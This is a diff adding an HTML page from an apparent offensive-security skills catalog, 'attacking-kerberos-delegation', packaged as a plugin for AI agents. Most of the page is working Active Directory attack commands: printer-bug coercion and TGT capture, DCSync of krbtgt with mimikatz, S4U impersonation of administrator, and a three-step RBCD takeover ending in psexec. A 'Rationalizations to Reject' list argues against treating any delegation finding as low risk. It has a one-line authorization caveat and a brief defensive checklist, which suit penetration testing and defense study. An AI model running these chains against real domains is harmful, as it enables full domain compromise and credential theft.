@@ -1,0 +1,175 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>attacking-kerberos-delegation — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / attacking-kerberos-delegation</div>
+  <h1 class="sk">attacking-kerberos-delegation</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Identify and abuse Active Directory Kerberos delegation — unconstrained delegation with printer-bug coercion, constrained delegation with protocol transition (S4U2Self/S4U2Proxy), and resource-based constrained delegation via machine-account creation and msDS-AllowedToActOnBehalfOfOtherIdentity. Use when BloodHound or enumeration flags delegation, when you control an account with an SPN or GenericWrite over a computer, or when escalating within a domain.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>Delegation lets a service impersonate users to other services. Every form of it is a controlled way to become someone else, and each has a misconfiguration that removes the control. RBCD in particular turns a common, low-looking permission — write access to a computer object — into full compromise of that host, which is why it is the delegation attack that comes up most.</p>
+<p>Only against domains you are authorized to test.</p>
+<h2>When to Use</h2>
+<ul>
+<li>BloodHound flags <code>Unconstrained</code>, <code>Constrained</code>, or <code>RBCD</code> delegation</li>
+<li>You control an account with an SPN, or <code>GenericWrite</code>/<code>GenericAll</code> over a</li>
+</ul>
+<p>computer object</p>
+<ul>
+<li>You can create machine accounts (default <code>MachineAccountQuota</code> is 10)</li>
+<li>You control a host configured for delegation</li>
+<li>Reviewing delegation configuration defensively</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Certificate Services abuse</strong> — use <a class="xref" href="abusing-adcs.html"><code>abusing-adcs</code></a></li>
+<li><strong>Kerberoasting, DCSync, general AD</strong> — use <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
+<li><strong>Entra ID</strong> — use <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></li>
+<li><strong>Detection</strong> — use <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>; TGS/S4U patterns and machine</li>
+</ul>
+<p>account creation (4741) are the telemetry</p>
+<h2>Enumerate the Three Types</h2>
+<pre><code># Constrained + unconstrained in one pass
+findDelegation.py domain.local/user:pass -dc-ip 10.0.0.10        # impacket
+# PowerView
+Get-DomainComputer -Unconstrained | select name
+Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth
+# RBCD is a per-object attribute; BloodHound's edges are the practical way to find it</code></pre>
+<p>Which type you are looking at decides everything:</p>
+<div class="tw"><table><thead><tr><th>Type</th><th>Marker</th><th>Direction of trust</th></tr></thead><tbody><tr><td>Unconstrained</td><td><code>TRUSTED_FOR_DELEGATION</code> on the account</td><td>Host can impersonate <em>anyone</em> who authenticates to it</td></tr><tr><td>Constrained</td><td><code>msDS-AllowedToDelegateTo</code> populated</td><td>Host can impersonate anyone, but only <em>to listed services</em></td></tr><tr><td>RBCD</td><td><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the target</td><td><em>Target</em> names who may impersonate to it</td></tr></tbody></table></div>
+<h2>Unconstrained Delegation</h2>
+<p>A host with unconstrained delegation caches the TGT of anyone who authenticates to it. Compromise the host, then coerce a high-value account — ideally a domain controller — to authenticate, and capture its TGT.</p>
+<pre><code># On the compromised unconstrained host, monitor for incoming TGTs
+Rubeus.exe monitor /interval:5 /nowrap
+# Coerce a DC to authenticate to you
+printerbug.py 'domain/user:pass@dc01.domain.local' attacker-host.domain.local
+# or PetitPotam, or the MS-EFSR / MS-RPRN coercion of your choice
+
+# Capture the DC's TGT, then DCSync with it
+Rubeus.exe ptt /ticket:&lt;base64 DC TGT&gt;
+mimikatz # lsadump::dcsync /user:krbtgt</code></pre>
+<p>The printer bug (MS-RPRN) and PetitPotam (MS-EFSR) exist precisely to force a target to authenticate. Coercing a domain controller to an unconstrained host is a direct path to domain compromise.</p>
+<h2>Constrained Delegation</h2>
+<p>A host with constrained delegation to a service can impersonate <em>any</em> user to that service — including a domain admin, and including yourself as a domain admin via S4U2Self followed by S4U2Proxy.</p>
+<pre><code># You control an account with msDS-AllowedToDelegateTo set to, say, cifs/dc01
+getST.py -spn cifs/dc01.domain.local -impersonate administrator \
+  'domain.local/svc_account:password' -dc-ip 10.0.0.10
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass domain.local/administrator@dc01.domain.local</code></pre>
+<p><strong>The alternate-service trick matters.</strong> S4U2Proxy returns a ticket for the SPN you request, but the service class is not cryptographically bound — a ticket for <code>cifs/dc01</code> can be rewritten to <code>host/dc01</code>, <code>ldap/dc01</code>, or <code>http/dc01</code>, because the target service only checks the server name. So delegation constrained to a "harmless" service like <code>time/dc01</code> still yields <code>ldap/dc01</code> and therefore DCSync. Do not dismiss a constrained delegation because the listed SPN looks benign.</p>
+<h2>Resource-Based Constrained Delegation (RBCD)</h2>
+<p>The highest-frequency delegation attack, because the prerequisite is common: write access to a computer object's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. <code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteDacl</code>, or <code>WriteProperty</code> over the target computer is enough.</p>
+<pre><code># 1. Create a machine account (default quota allows 10 per user)
+addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123' \
+  domain.local/user:pass -dc-ip 10.0.0.10
+
+# 2. Write your new account into the target's RBCD attribute
+rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
+  domain.local/user:pass -dc-ip 10.0.0.10
+
+# 3. Impersonate any user to the target via S4U
+getST.py -spn cifs/target.domain.local -impersonate administrator \
+  'domain.local/EVIL$:Password123' -dc-ip 10.0.0.10
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass domain.local/administrator@target.domain.local</code></pre>
+<p>This is why a BloodHound <code>GenericWrite</code> edge to a computer is not a low finding. It is a full takeover of that computer through three commands. When you report a write primitive over a computer object, report it at RBCD severity.</p>
+<p><strong>If <code>MachineAccountQuota</code> is 0</strong>, you cannot create a machine account — but any existing account you control that has an SPN works as the "from" identity, and if you can set an SPN on a user account you control (via <code>GenericWrite</code> on yourself or another user), that substitutes.</p>
+<h2>Protected Accounts</h2>
+<p>Several targets resist impersonation regardless of the delegation path:</p>
+<ul>
+<li>Members of <strong>Protected Users</strong> cannot be delegated.</li>
+<li>Accounts flagged <strong>"Account is sensitive and cannot be delegated"</strong></li>
+</ul>
+<p>(<code>NOT_DELEGATED</code>) are excluded.</p>
+<ul>
+<li>If your intended impersonation target is protected, pick a different</li>
+</ul>
+<p>privileged account that is not — there is almost always one.</p>
+<p>Check before spending effort:</p>
+<pre><code>Get-DomainUser -AllowDelegation -AdminCount | select name       # delegatable admins</code></pre>
+<h2>Defensive Review</h2>
+<ul>
+<li>Which accounts have unconstrained delegation, and do any need it? (A DC does;</li>
+</ul>
+<p>little else should.)</p>
+<ul>
+<li>Are privileged accounts in Protected Users and flagged <code>NOT_DELEGATED</code>?</li>
+<li>Is <code>MachineAccountQuota</code> reduced to 0?</li>
+<li>Who has write access over computer objects — especially servers and DCs?</li>
+<li>Is delegation to service classes on domain controllers audited?</li>
+<li>Are S4U2Self/S4U2Proxy patterns monitored?</li>
+</ul>
+<h2>Rationalizations to Reject</h2>
+<ul>
+<li><em>"The delegation is only to a harmless service."</em> The service class is</li>
+</ul>
+<p>rewritable. <code>time/dc01</code> becomes <code>ldap/dc01</code>.</p>
+<ul>
+<li><em>"It's just GenericWrite on a computer, low severity."</em> That is RBCD. It is a</li>
+</ul>
+<p>full host takeover.</p>
+<ul>
+<li><em>"We can't create machine accounts, quota is 0."</em> Any SPN-bearing account you</li>
+</ul>
+<p>control substitutes.</p>
+<ul>
+<li><em>"Unconstrained delegation is on a member server, not a DC."</em> Coerce a DC to</li>
+</ul>
+<p>authenticate to it. The server's trust level is irrelevant.</p>
+<ul>
+<li><em>"The impersonation target is a domain admin, it must be protected."</em> Check.</li>
+</ul>
+<p>Most admins are not in Protected Users.</p>
+<ul>
+<li><em>"BloodHound didn't draw the edge."</em> Delegation attributes need current</li>
+</ul>
+<p>collection; older data misses RBCD entirely.</p>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Credential Access</strong> (TA0006)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1558/">T1558</a> Steal or Forge Kerberos Tickets — see also <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li><a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a> — DCSync and the wider domain path this feeds</li>
+<li><a class="xref" href="abusing-adcs.html"><code>abusing-adcs</code></a> — the other high-yield escalation family; often chains with this</li>
+<li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> — S4U and machine-account-creation telemetry</li>
+<li><a class="xref" href="reporting-security-findings.html"><code>reporting-security-findings</code></a> — severity for write-primitive findings</li>
+<li>impacket (getST, rbcd, addcomputer, findDelegation), Rubeus, PowerView, BloodHound</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
